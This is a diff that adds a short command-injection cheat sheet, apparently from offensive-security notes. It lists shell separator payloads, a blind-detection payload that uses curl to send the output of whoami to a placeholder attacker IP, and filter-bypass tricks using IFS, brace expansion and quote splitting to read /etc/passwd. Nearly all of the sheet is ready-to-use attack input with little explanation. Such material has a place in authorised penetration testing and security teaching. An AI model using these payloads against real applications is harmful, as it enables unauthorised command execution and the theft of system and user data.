@@ -1,0 +1,33 @@
+# Command Injection
+
+## Basic Payloads
+
+Inject after shell metacharacters: the app concatenates your input into a system call, so append a second command with a separator.
+
+```bash
+; id
+| id
+|| id
+&& id
+`id`
+$(id)
+```
+
+## Blind Detection
+
+When there's no visible output, use time delays or out-of-band callbacks to confirm execution.
+
+```bash
+; sleep 5
+; curl http://<your-ip>/$(whoami)
+```
+
+## Bypass Filters
+
+Filters often look for specific characters or keywords: use IFS, brace expansion, or string splitting to reconstruct the command without triggering them.
+
+```bash
+${IFS}id
+{cat,/etc/passwd}
+c'a't /etc/passwd
+```
